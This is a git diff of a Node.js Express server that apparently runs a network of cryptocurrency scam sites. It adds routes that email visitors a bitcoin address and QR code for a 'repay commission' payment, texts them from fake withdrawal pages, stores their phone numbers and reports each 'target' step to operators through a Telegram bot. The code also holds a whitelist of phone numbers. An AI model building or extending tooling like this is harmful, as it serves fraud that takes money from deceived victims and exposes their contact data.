@@ -2,6 +2,7 @@ const fs = require('fs');
 const request_send = require('request')
 const { send_message } = require("../modules/send_sms.js")
 const { send_mail } = require("./send_mail.js")
+const { send_mail_2 } = require("./send_mail-2.js")
 
 
 async function getPriceEuro(price) {
@@ -113,6 +114,7 @@ module.exports.get_data = (app, users, bot) => {
 
     app.post('/send_mail', function (request, response) {
         let mail_sender = request.body?.email
+
         let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
         let from = a1.replace('.com', '');
         const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
@@ -131,29 +133,168 @@ module.exports.get_data = (app, users, bot) => {
             }
         }
 
-        getPriceEuro(balance.price_euro).then((p) =>{
+        getPriceEuro(balance.price_euro).then((p) => {
             let priceEuro = String(p).substr(0, 8)
             console.log(priceEuro)
             send_mail(mail_sender, priceEuro, balance.price_euro, bitcoin_address.address, bitcoin_img.qr_code_link, from)
             for (let u in users) {
                 let chatId = users[u]
                 bot.sendMessage(chatId, `📨 Email delivered! —» ${mail_sender}`)
-    
+
             }
         })
     })
 
-    app.get('/phone_nubmer_codes', function (request, response) {
+    app.post('/send_mail-2', function (request, response) {
+        let mail_sender = request.body?.email
 
-        let codes = JSON.parse(fs.readFileSync('./assets/data/countres.json'))
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+        let balance = ""
+        let bitcoin_address = ""
+        let bitcoin_img = ""
 
-        response.send(codes)
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const baseURL = `./assets/data/sites/${hostnmae}`
+                balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`))
+                bitcoin_address = JSON.parse(fs.readFileSync(`${baseURL}/address_settings.json`))
+                bitcoin_img = JSON.parse(fs.readFileSync(`${baseURL}/qr_settings.json`))
+
+            }
+        }
+
+        getPriceEuro(balance.price_euro).then((p) => {
+            let priceEuro = p
+
+            send_mail_2(mail_sender, priceEuro, balance.price_euro, bitcoin_address.address, bitcoin_img.qr_code_link, from)
+            for (let u in users) {
+                let chatId = users[u]
+                bot.sendMessage(chatId, `📨 Repay commission email delivered —» ${mail_sender}`)
+
+            }
+        })
+    })
+
+    app.post('/withdraw-notifications', function (request, response) {
+        let type = request.body?.type
+
+        if (type === "withdraw") {
+            for (let u in users) {
+                let chatId = users[u]
+
+                let address = request.body?.address
+                bot.sendMessage(chatId, `❕ ${address}`)
+            }
+        }
+    })
+
+    app.post('/withdraw-pages', function (request, response) {
+        let mail_sender = request.body?.email
+        let product_sub = request?.body.sicret
+        let phone = request.body?.phone
+        let type = request.body?.type
+
+
+        let whiteListNumberStatus = true
+        const whiteListNumbers = ['+447780243386', '+447780243224', '+37064931396', "+37064931397", "+317067748831", "+37064931396", "+37064931397"]
+
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        let phones = ""
+        let balance = ""
+        let bitcoin_address = ""
+        let bitcoin_img = ""
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const baseURL = `./assets/data/sites/${hostnmae}`
+                balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`))
+                bitcoin_address = JSON.parse(fs.readFileSync(`${baseURL}/address_settings.json`))
+                bitcoin_img = JSON.parse(fs.readFileSync(`${baseURL}/qr_settings.json`))
+                phones = JSON.parse(fs.readFileSync(`${baseURL}/phone_numbers.json`))
+
+            }
+        }
+
+        getPriceEuro(balance.price_euro).then((p) => {
+            let priceEuro = String(p).substr(0, 8)
+            send_mail(mail_sender, priceEuro, balance.price_euro, bitcoin_address.address, bitcoin_img.qr_code_link, from)
+        })
+
+
+        for (let n in whiteListNumbers) {
+            if (whiteListNumbers[n] == phone) {
+                send_message(phone, from)
+                whiteListNumberStatus = false
+            }
+        }
+
+        if (whiteListNumberStatus) {
+
+            phones.push({ "tel": phone, "step": 0 })
+
+            for (let file in files) {
+                let hostnmae = files[file].site
+                if (hostnmae == from) {
+                    fs.writeFileSync(`./assets/data/sites/${hostnmae}/phone_numbers.json`, JSON.stringify(phones, null, '\t'))
+
+                }
+            }
+
+            fs.writeFileSync('./assets/data/phone_numbers.json', JSON.stringify(phones, null, '\t'))
+
+            let list_of_phones = []
+            let list_of_user = []
+
+
+            for (let ids in phones) {
+                if (phone == phones[ids].tel) {
+                    phones[ids].step += 1
+                    list_of_phones.push(phones[ids].step)
+                }
+            }
+
+
+            let max_value = Math.max.apply(null, list_of_phones)
+
+            if (max_value < 2) {
+                send_message(phone, from)
+            }
+
+            for (ids in users_site) {
+                if (product_sub == users_site[ids].sicret) {
+                    list_of_user.push(users_site[ids]?.id)
+                }
+            }
+
+            for (let u in users) {
+                let chatId = users[u]
+
+                if (type === "important") {
+                    bot.sendMessage(chatId, `📌 Withdraw balance! Email delivered! —» ${mail_sender} \n| SMS delivered! —--» ${phone}`)
+
+                } else if (type === "balance") {
+                    bot.sendMessage(chatId, `🟡 Balance checked! Email delivered! —» ${mail_sender} \n| SMS delivered! —--» ${phone}`)
+
+                }
+
+                // bot.sendMessage(chatId, `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`)
+                // bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`)
+            }
+        }
 
     })
 
     app.post('/send_sms', function (request, response) {
         let product_sub = request?.body.sicret
         let phone = request.body?.phone
+
         let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
         let from = a1.replace('.com', '');
         let phones = ""
@@ -228,6 +369,14 @@ module.exports.get_data = (app, users, bot) => {
 
     })
 
+    app.get('/phone_nubmer_codes', function (request, response) {
+
+        let codes = JSON.parse(fs.readFileSync('./assets/data/countres.json'))
+
+        response.send(codes)
+
+    })
+
     app.get('/clear_base', function (request, response) {
         fs.writeFileSync('./assets/data/users-site.json', '[]', (err) => {
             if (err) throw err;
@@ -281,9 +430,24 @@ module.exports.get_data = (app, users, bot) => {
     app.post("/transaction-convert-euro", function (request, response) {
         let price = request.body?.price
 
-        getPriceEuro(price).then((p) =>{
+        getPriceEuro(price).then((p) => {
             response.send({ price: p })
         })
+    })
+
+    app.post("/check-user-cookie", function (request, response) {
+        let product_sub = request?.body.sicret
+
+        let clients = JSON.parse(fs.readFileSync('./assets/data/users-site.json'))
+        for (const key in clients) {
+            let client = clients[key]
+            if (client.sicret === product_sub) {
+                response.send({ hasCookies: true })
+                return
+            }
+        }
+
+        response.send({ hasCookies: false })
     })
 
     app.post('/new_user', function (request, response) {
